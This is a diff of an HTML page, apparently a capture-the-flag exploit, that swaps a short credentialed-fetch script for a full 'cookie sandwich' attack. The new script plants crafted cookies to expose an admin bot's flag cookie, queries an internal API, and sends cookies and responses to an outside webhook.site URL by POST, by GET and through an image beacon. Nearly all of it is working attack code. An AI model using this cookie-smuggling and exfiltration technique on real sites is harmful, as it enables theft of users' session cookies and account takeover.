@@ -1,16 +1,130 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>bot1‑leak</title>
+    <meta charset="UTF-8">
+    <title>Cookie Sandwich Exploit</title>
 </head>
 <body>
-<script>
-const WEBHOOK = "https://webhook.site/1f9b4f19-2450-4597-88a2-f1f2a4440af4";
+    <h1>Cookie Sandwich Exploit</h1>
+    <div id="status">Setting up cookie sandwich...</div>
+    <div id="result"></div>
 
-fetch("http://seekdeep:3000/profile", { credentials: "include", mode:"no-cors" })
-  .then(() => fetch(WEBHOOK, { mode:"no-cors" }));   // fire‑and‑forget
-</script>
-
+    <script>
+        // Set up the cookie sandwich targeting the flag cookie
+        // The admin bot has: flag=cube{...}; ascend=...; lucky=...; spirit=...; colors=...; riddle=...
+        
+        console.log("Setting up cookie sandwich...");
+        
+        // Create the sandwich that will try to expose the flag cookie
+        document.cookie = `$Version=1;`;
+        document.cookie = `exploit1="start`;  // This will start the quoted section
+        document.cookie = `exploit2=end";`;    // This will end the quoted section
+        
+        console.log("Cookie sandwich created");
+        console.log("Current cookies:", document.cookie);
+        
+        // Function to exfiltrate data
+        function exfiltrate(data) {
+            // Replace with your actual webhook/server URL
+            const exfilUrl = 'https://webhook.site/1f9b4f19-2450-4597-88a2-f1f2a4440af4';
+            
+            // Also try to send via GET request in case POST fails
+            const params = new URLSearchParams();
+            params.append('data', JSON.stringify(data));
+            
+            // Try both methods
+            fetch(exfilUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(e => console.log('POST exfil failed:', e));
+            
+            // Fallback GET method
+            fetch(exfilUrl + '?' + params.toString()).catch(e => console.log('GET exfil failed:', e));
+            
+            // Try image-based exfiltration
+            const img = new Image();
+            img.src = exfilUrl + '?cookies=' + encodeURIComponent(document.cookie);
+        }
+        
+        // Wait for cookies to be processed
+        setTimeout(() => {
+            console.log("Checking for flag exposure...");
+            
+            // Check all cookies for flag content
+            const allCookies = document.cookie;
+            console.log("All cookies:", allCookies);
+            
+            // Look for flag patterns
+            const flagPattern = /flag\{[^}]+\}/i;
+            const cubePattern = /cube\{[^}]+\}/i;
+            
+            let foundFlag = false;
+            
+            if (flagPattern.test(allCookies)) {
+                console.log("FLAG FOUND IN COOKIES!");
+                document.getElementById('status').innerHTML = '<h2 style="color: green;">FLAG FOUND!</h2>';
+                foundFlag = true;
+            }
+            
+            if (cubePattern.test(allCookies)) {
+                console.log("CUBE FLAG FOUND IN COOKIES!");
+                document.getElementById('status').innerHTML = '<h2 style="color: green;">CUBE FLAG FOUND!</h2>';
+                foundFlag = true;
+            }
+            
+            // Try the prophecies API
+            fetch('/api/prophecies')
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Prophecies data:", data);
+                    
+                    // Check if flag is in prophecies response
+                    const prophecyStr = JSON.stringify(data);
+                    if (flagPattern.test(prophecyStr) || cubePattern.test(prophecyStr)) {
+                        console.log("FLAG FOUND IN PROPHECIES!");
+                        document.getElementById('status').innerHTML = '<h2 style="color: green;">FLAG IN PROPHECIES!</h2>';
+                        foundFlag = true;
+                    }
+                    
+                    // Display results
+                    document.getElementById('result').innerHTML = 
+                        '<h2>Prophecies:</h2><pre>' + JSON.stringify(data, null, 2) + '</pre>' +
+                        '<h2>All Cookies:</h2><pre>' + allCookies + '</pre>';
+                    
+                    // Exfiltrate everything
+                    exfiltrate({
+                        cookies: allCookies,
+                        prophecies: data,
+                        flagFound: foundFlag,
+                        timestamp: new Date().toISOString()
+                    });
+                })
+                .catch(error => {
+                    console.error('Prophecies API error:', error);
+                    
+                    // Still exfiltrate cookie data
+                    exfiltrate({
+                        cookies: allCookies,
+                        error: error.toString(),
+                        timestamp: new Date().toISOString()
+                    });
+                });
+        }, 1000);
+        
+        // Try different timing to catch any delayed cookie processing
+        setTimeout(() => {
+            const laterCookies = document.cookie;
+            console.log("Later cookies check:", laterCookies);
+            
+            if (laterCookies !== document.cookie) {
+                console.log("Cookies changed!");
+                exfiltrate({
+                    laterCookies: laterCookies,
+                    timestamp: new Date().toISOString()
+                });
+            }
+        }, 5000);
+    </script>
 </body>
 </html>
